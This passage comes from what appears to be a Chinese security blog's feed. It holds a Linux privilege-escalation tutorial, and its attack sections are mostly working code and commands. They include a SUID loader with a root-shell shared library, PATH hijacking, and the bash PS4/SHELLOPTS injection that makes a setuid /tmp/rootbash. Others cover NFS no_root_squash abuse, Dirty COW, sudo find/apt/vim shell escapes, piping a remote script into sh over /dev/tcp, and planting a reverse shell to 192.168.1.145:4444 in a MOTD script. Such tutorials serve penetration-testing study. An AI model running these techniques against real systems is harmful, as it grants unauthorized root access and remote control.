class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 检查是否提供了正确数量的参数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage: %s &lt;path to .so file>\\n\"</span><span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 使用 dlopen 函数加载共享库</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// RTLD_LAZY 表示在 dlopen 返回前，解析器不会解析库中的任何符号</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 符号解析将推迟到第一次调用 dlsym 或者第一次访问这些符号时进行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>handle <span class=\"token operator\">=</span> <span class=\"token function\">dlopen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> RTLD_LAZY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>handle<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">// 如果 dlopen 返回 NULL，表示加载共享库失败</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// 此时可以使用 dlerror 函数获取错误信息</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Error: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dlerror</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 使用 dlclose 函数卸载共享库</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">// 如果共享库不再需要，应该尽快卸载，以节省内存资源</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">dlclose</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编译好给 s 权限</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-o</span> loader loader.c <span class=\"token parameter variable\">-ldl</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">chown</span> root:root loader</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">chmod</span> u+s loader</pre></td></tr></table></figure><p>这段程序会接受我们传入的参数这个参数就是一个共享库 so 文件，因为这个文件是有 s 位权限的我们就可以写一个提权的 so 文件执行以后就会获取 root 权限的 shell</p>\n<p>编写一个共享库文件里面是提权代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 使用 attribute ((constructor)) 标记，使得这个函数在 main 函数执行前被调用</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 将当前进程的用户 ID 和组 ID 设置为 0（对应 root 用户）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 启动一个新的 bash shell</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">//-p 选项会让 bash 保留特权，这意味着新启动的 shell 会以 root 权限运行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#编译成 so</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gcc <span class=\"token parameter variable\">-shared</span> <span class=\"token parameter variable\">-fPIC</span> <span class=\"token parameter variable\">-o</span> shell2.so shell2.c</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#生成一个名为 shell.so 的共享库文件。-shared 生成一个共享库，-fPIC 生成位置无关代码，</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224223157195.png\" alt=\"image-20240224223157195\"></p>\n<p>执行 /usr/local/bin/loader <span class=\"exturl\" data-url=\"aHR0cDovL3NoZWxsLnNv\">shell.so</span></p>\n<p>当前权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224225741050.png\" alt=\"image-20240224225741050\"></p>\n<p>执行以后</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224225907104.png\" alt=\"image-20240224225907104\"></p>\n<p>原理：</p>\n<p>漏洞点在于程序允许任何用户加载并执行任意的共享库。如果一个恶意用户能够控制被加载的共享库，那么他们就可以执行任意代码，并且由于程序设置了  <code>SUID</code>  位，这段代码将以文件所有者（在我们的例子中是 root 用户）的权限来执行。</p>\n<p>例如，可以创建一个共享库，其中包含一个构造函数（在共享库被加载时自动执行的函数），这个构造函数执行一些恶意操作，如创建一个 root shell。然后可以通过程序来加载这个共享库。由于程序设置了  <code>SUID</code>  位，这个共享库将以 root 用户的权限来执行，因此就可以获得 root 权限。</p>\n<h4 id=\"suid环境变量劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#suid环境变量劫持提权\">#</a> SUID 环境变量劫持提权</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 尝试执行 shell 程序</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"错误：没有找到shell\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell程序已成功执行\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为它使用了 <code>system</code>  函数，而 <code>system</code>  函数会在用户的环境变量 <code>PATH</code>  中查找命令。因此，如果用户有权限修改自己的环境变量，就可以劫持 <code>shell</code>  文件写一个同名文件然后写入提权程序拿到 root</p>\n<p>在 /home/kali/hc 创建一个 shell 程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>       <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>更改临时环境便变量让程序执行时首先查找 /home/kali/hc 目录下有没有 shell</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/home/kali/hc:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali/hc</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240225152031452.png\" alt=\"image-20240225152031452\"></p>\n<h4 id=\"suid-滥用shell功能提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-滥用shell功能提权\">#</a> SUID - 滥用 shell 功能提权</h4>\n<p>查看 bash 版本在 bash 版本低于 4.4 的时候用</p>\n<p><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/local/bin/suid4</code>  进行提权</p>\n<p>原理为：</p>\n<p><code>env -i</code> ：这个命令用于运行一个程序，在一个新的、空的环境中。也就是说，它不会继承任何环境变量。</p>\n<p><code>SHELLOPTS=xtrace</code> ：这个环境变量设置 Bash shell 进入追踪模式（xtrace），在这种模式下，Bash 会打印出执行的每一条命令。</p>\n<p>然后用 PS4 配合 xtrace 提权 PS4 是一个环境变量这个环境变量设置了 Bash shell 在打印追踪信息时使用的提示符</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>默认<span class=\"token environment constant\">PS4</span><span class=\"token variable\"><span class=\"token variable\">`</span> 的值设置为 <span class=\"token variable\">`</span></span><span class=\"token string\">'+'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>也就是我们打开xtrace模式打印出来的命令前面的+号</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token assign-left variable\"><span class=\"token environment constant\">PS4</span></span><span class=\"token operator\">=</span><span class=\"token string\">'Line $&#123;LINENO&#125;: '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> <span class=\"token parameter variable\">-x</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Hello, world!\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>运行这个脚本，你会看到：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Line <span class=\"token number\">4</span>: <span class=\"token builtin class-name\">echo</span> Hello, world<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Hello, world<span class=\"token operator\">!</span></pre></td></tr></table></figure><p><code>PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'</code> ：我们把他替换为了 <code>'$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'</code>  这些命令复制  <code>/bin/bash</code>  到  <code>/tmp/rootbash</code> ，并给予新文件 SUID 权限。这意味着任何用户运行  <code>/tmp/rootbash</code>  时，都会以文件所有者（在这种情况下是 root）的权限来运行。</p>\n<p><code>/usr/local/bin/suid4</code> ：这是要以新环境运行的程序。一个有 s 位的程序，由于  <code>SHELLOPTS</code>  和  <code>PS4</code>  的设置，它会在运行时执行  <code>PS4</code>  中的命令也就是复制出一个具有 root 权限的 bash shell 到 /tmp</p>\n<p>然后我们运行 <code>rootbash -p</code>  即可获得 root 权限的 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240225180540986.png\" alt=\"image-20240225180540986\"></p>\n<p>可看到运行后生成了 rootbash 获取了 root</p>\n<p>当然可以将  <code>PS4</code>  中的命令替换为任何有效的 Bash 命令。因为  <code>PS4</code>  变量的值会在每次打印追踪信息之前被执行。所以你可以在  <code>PS4</code>  中插入任何你想要在每次命令执行之前运行的代码。</p>\n<h3 id=\"nsf提权\"><a class=\"markdownIt-Anchor\" href=\"#nsf提权\">#</a> NSF 提权</h3>\n<p>nsf 是 Linux 系统中用于共享文件和目录的功能通过 NFS，用户和程序可以访问远程系统上的文件，就像访问本地文件一样</p>\n<p>nsf 的配置在 /etc/exports 文件中</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226133638600.png\" alt=\"image-20240226133638600\"></p>\n<p>这行表示共享  <code>/tmp</code>  目录，所有的网络主机都可以访问（由  <code>*</code>  表示），有读写权限（由  <code>rw</code>  表示），共享将立即写入磁盘就是立即生效（由  <code>sync</code>  表示），  <code>insecure</code>  允许非保留端口连接 ，禁止 root 权限映射（由  <code>no_root_squash</code>  表示），并且不检查子目录的权限（由  <code>no_subtree_check</code>  表示）。</p>\n<p>特别是有 no_root_squash 启用  <code>no_root_squash</code>  会使得 root 在 NFS 客户端上拥有和服务器上相同的权限</p>\n<p>利用：</p>\n<p>创建一个目录进行挂载</p>\n<p><code>mkdir /home/kali/hc/nfs-shell</code></p>\n<p><code>mount -o rw,vers=3 192.168.1.144:/tmp /home/kali/hc/nfs-shell</code></p>\n<p>rw 读写权限，vers3 版本</p>\n<p>成功挂载</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226142439658.png\" alt=\"image-20240226142439658\"></p>\n<p>接下来写一个提权程序</p>\n<p><code>vim shell.c</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编译然后给 shell 执行权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226145826134.png\" alt=\"image-20240226145826134\"></p>\n<p>回到受害机执行提权到 root</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226170226574.png\" alt=\"image-20240226170226574\"></p>\n<h3 id=\"内核提权\"><a class=\"markdownIt-Anchor\" href=\"#内核提权\">#</a> 内核提权</h3>\n<p>查看内核版本 <code>uname -a</code></p>\n<p><code>curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></p>\n<p>下载 linpeas 脚本收集信息</p>\n<p>如果没有 curl 可以用 kali 下载 nc 传过来</p>\n<p><code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></p>\n<p>kali： <code>nc -lvnp 80 &lt; linpeas.sh</code></p>\n<p>受害： <code>cat &lt; /dev/tcp/192.168.1.145/80 | sh</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226191302928.png\" alt=\"image-20240226191302928\"></p>\n<h4 id=\"脏牛提权cve-2016-5195\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权cve-2016-5195\">#</a> 脏牛提权 (CVE-2016-5195)</h4>\n<p><code>searchsploit</code>  搜索脏牛</p>\n<p>​\t<img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226192506760.png\" alt=\"image-20240226192506760\"></p>\n<p>有这些漏洞利用脚本下一个</p>\n<p><code>searchsploit -m 40839.c</code></p>\n<p>传到受害查看说明</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226192639018.png\" alt=\"image-20240226192639018\"></p>\n<p>要用 - pthread 和 - lcrypt 编译编译好后执行然后输入新的密码就可以了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226193427616.png\" alt=\"image-20240226193427616\"></p>\n<h3 id=\"motd机制提权\"><a class=\"markdownIt-Anchor\" href=\"#motd机制提权\">#</a> MOTD 机制提权</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226195723017.png\" alt=\"image-20240226195723017\"></p>\n<p><code>update-motd.d</code>  目录下的脚本在用户通过 SSH 登录时会被执行，用于生成登录后的欢迎信息这些脚本通常以 root 权限运行</p>\n<p><code>00-header</code>  是  <code>update-motd.d</code>  目录下的一个脚本如果一个用户对  <code>00-header</code>  文件有写权限，那么他们就可以修改这个文件，插入一些恶意代码例如，他们可以添加一个修改 root 用户密码的命令或者反弹 shell 当其他用户通过 SSH 登录时， <code>00-header</code>  脚本会以 root 权限运行，执行其中的命令</p>\n<p><code>vim </code> 输入 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.145/4444 0&gt;&amp;1&quot;</code></p>\n<p>kali 监听 <code>nc -lvnp 4444</code></p>\n<p>再重新 ssh 登陆让他执行这个脚本，成功拿到 root</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226200442064.png\" alt=\"image-20240226200442064\"></p>\n<h3 id=\"sudo提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo提权\">#</a> sudo 提权</h3>\n<h4 id=\"sudofind-提权\"><a class=\"markdownIt-Anchor\" href=\"#sudofind-提权\">#</a> sudofind 提权</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-exec</span> /bin/sh <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">;</span> <span class=\"token parameter variable\">-quit</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301183010100.png\" alt=\"image-20240301183010100\"></p>\n<h4 id=\"sudoapt提权\"><a class=\"markdownIt-Anchor\" href=\"#sudoapt提权\">#</a> sudoapt 提权</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update <span class=\"token parameter variable\">-o</span> APT::Update::Pre-Invoke::<span class=\"token operator\">=</span>/bin/sh</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301183347295.png\" alt=\"image-20240301183347295\"></p>\n<h4 id=\"sudovim提权\"><a class=\"markdownIt-Anchor\" href=\"#sudovim提权\">#</a> sudovim 提权</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> <span class=\"token parameter variable\">-c</span> <span class=\"token string\">':!/bin/sh'</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301193448209.png\" alt=\"image-20240301193448209\"></p>\n<h3 id=\"gtfobins\"><a class=\"markdownIt-Anchor\" href=\"#gtfobins\">#</a> GTFOBins</h3>\n<p>这个网站可以搜索更多 sudo suid 提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301201128501.png\" alt=\"image-20240301201128501\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301201241369.png\" alt=\"image-20240301201241369\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "title": "Windows提权",
            "date_published": "2023-11-09T12:28:50.000Z",
